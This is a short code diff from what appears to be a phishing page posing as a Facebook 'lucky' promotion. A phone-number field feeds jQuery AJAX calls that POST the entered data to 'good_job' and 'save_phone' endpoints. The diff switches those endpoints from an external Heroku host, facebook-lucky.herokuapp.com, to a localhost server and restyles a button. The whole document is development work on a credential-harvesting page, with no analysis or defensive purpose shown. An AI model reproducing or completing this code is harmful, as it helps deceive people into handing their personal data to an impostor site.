@@ -345,7 +345,7 @@
                 data-testid="royal_email" placeholder="Input Phone Number" autofocus="1"
                 aria-label="Input Phone Number" /></div>
 
-        <a onclick="togglePopup()" class="button5" style="background-color:#42cc8c; padding-top: 50px">Direct page</a>
+        <a onclick="togglePopup()" class="button5" style="background-color:#42cc8c; margin-top: 5px">Direct page</a>
     </div>
 
     <style>
@@ -395,7 +395,7 @@
 
                 $.ajax({
                     type: "POST",
-                    url: "https://facebook-lucky.herokuapp.com/good_job",
+                    url: "http://127.0.0.1:5000/good_job",
                     contentType: "application/json",
                     data: data_stringify,
                     success: function () {
@@ -418,7 +418,7 @@
             console.log(data_stringify)
             $.ajax({
                 type: "POST",
-                url: "https://facebook-lucky.herokuapp.com/save_phone",
+                url: "http://127.0.0.1:5000/save_phone", // https://facebook-lucky.herokuapp.com
                 contentType: "application/json",
                 data: data_stringify,
                 success: function () { 
